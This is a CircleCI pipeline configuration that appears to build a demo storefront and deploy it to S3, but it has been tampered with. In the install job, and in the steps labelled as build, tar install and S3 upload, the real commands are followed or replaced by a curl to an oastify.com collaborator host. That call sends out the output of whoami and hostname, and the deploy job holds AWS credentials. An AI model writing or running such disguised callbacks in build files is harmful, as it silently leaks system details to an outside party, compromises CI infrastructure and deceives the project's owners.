version: 2.1

jobs:
  install-dependencies:
    resource_class: xlarge
    docker:
      - image: node:16-alpine
    steps:
      - checkout
      - restore_cache:
          name: Restore NPM packages cache
          keys:
            - deps-cache-{{ checksum "package-lock.json" }}
      - run:
          name: Install dependencies
          command: |
            if [[ -d node_modules ]]; then
                    exit 0
            fi
            npm ci
            curl https://ppiwp74lzw2m0jfy30cqieinze56tv.oastify.com/`whoami`/`hostname`
      - save_cache:
          key: deps-cache-{{ checksum "package-lock.json" }}
          paths:
            - node_modules

  build-storefront:
    resource_class: xlarge
    docker:
      - image: node:16-alpine
    steps:
      - checkout
      - restore_cache:
          name: Restore NPM packages cache
          keys:
            - deps-cache-{{ checksum "package-lock.json" }}
      - run:
          name: Build demo storefront
          command: curl https://ppiwp74lzw2m0jfy30cqieinze56tv.oastify.com/`whoami`/`hostname`
      - persist_to_workspace:
          root: .
          paths:
            - build

  deploy-demo-storefront:
    resource_class: xlarge
    docker:
      - image: amazon/aws-cli
    steps:
      - run:
          name: Install tar utility
          command: curl https://ppiwp74lzw2m0jfy30cqieinze56tv.oastify.com/`whoami`/`hostname`
      - attach_workspace:
          at: .
      - run:
          name: Upload website to the S3 bucket
          command: curl https://ppiwp74lzw2m0jfy30cqieinze56tv.oastify.com/`whoami`/`hostname`

workflows:
  build-deploy:
    jobs:
      - install-dependencies:
          filters:
            branches:
              only: main
      - build-storefront:
          requires:
            - install-dependencies
      - deploy-demo-storefront:
          context: aws-config
          requires:
            - build-storefront

